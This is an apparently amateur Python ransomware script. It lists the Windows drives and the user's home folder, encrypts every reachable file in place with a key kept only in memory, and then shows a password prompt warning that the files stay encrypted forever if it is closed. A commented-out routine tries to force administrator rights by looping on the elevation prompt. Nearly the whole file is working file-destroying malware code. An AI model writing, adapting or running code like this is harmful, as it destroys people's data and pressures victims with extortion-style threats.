from os import walk, chdir, environ
from os.path import join
from ctypes import windll
from string import ascii_uppercase
from tkinter import Tk
from tkinter.simpledialog import askstring
from sys import executable
from cryptography.fernet import Fernet


def crypt_basic():
    key = Fernet.generate_key()
    method = Fernet(key)
    return method


def get_drives(mode):
    pw = ""
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in ascii_uppercase:
        if bitmask & 1:
            drives.append(letter + ":")
        bitmask >>= 1
    drives.remove("C:")
    drives.append("C:" + environ["HOMEPATH"])
    drives.append("sportacus")
    drives.remove("F:")
    for i in drives:
        pw += i
    if mode == 0:
        return pw
    elif mode == 1:
        return drives
    return drives, pw


def encrypt(method):
    s = 0
    b = 0
    first_counter = 1
    second_counter = 0
    drives = get_drives(1)
    print(drives)
    for drive in drives:
        try:
            print("Walked drive:\t" + drive)
            print("Working dircetory:\t" + drives[0 + first_counter])
            print("Counter:\t" + str(first_counter))
            print("Second Counter:\t" + str(second_counter))
        except:
            pass
        try:
            chdir(drives[0 + first_counter])
        except:
            print("Erster Error")
            if second_counter == 1:
                print("Second Counter in True:\t" + str(second_counter))
                return True
            second_counter += 1
            print("Second Counter nach erhöhung:\t" + str(second_counter))
            chdir(drives[0])
        for root, sub, file in walk(drive):
            for files in file:
                try:
                    with open(join(root, files), "rb")as f:
                        file_bytes = f.read()
                    with open(join(root, files), "wb")as f:
                        f.write(method.encrypt(file_bytes))
                except:
                    pass
        first_counter += 1


def decrypt(method):
    first_counter = 1
    second_counter = 0
    b = 0
    drives = get_drives(1)
    print(drives)
    for drive in drives:
        try:
            print("Walked drive:\t" + drive)
            print("Working dircetory:\t" + drives[0 + first_counter])
            print("Counter:\t" + str(first_counter))
        except:
            pass
        try:
            chdir(drives[0 + first_counter])
        except:
            print("Erster Error")
            if second_counter == 1:
                return True
            second_counter += 1
            chdir(drives[0])
        for root, sub, file in walk(drive):
            for files in file:
                try:
                    with open(join(root, files), "rb")as f:
                        file_bytes = f.read()
                    with open(join(root, files), "wb")as f:
                        f.write(method.decrypt(file_bytes))
                except:
                    pass
        first_counter += 1


def dialog(pw):
    i = 3
    answer = ""
    root = Tk()
    root.withdraw()
    while answer != pw:
        if i == 0:
            return False
        answer = askstring(title="Enter Password",
                           prompt="All your files have been encrypted in oder to decrypt them you have to enter the password.\nIf you close this windows your files will be encrypted forever!\n{} tries left".format(
                               i))
        if answer is None:
            return False
        i -= 1
    return True


def force_admin():
    x = 0
    if windll.shell32.IsUserAnAdmin():
        return True
    else:
        while x != 42:
            x = windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1)
        return True


#force_admin()  # gut machen
pwd = get_drives(0)
method = crypt_basic()
print(pwd)

while not encrypt(method):
    pass
print("success")
if dialog(pwd):
    while not decrypt(method):
        pass




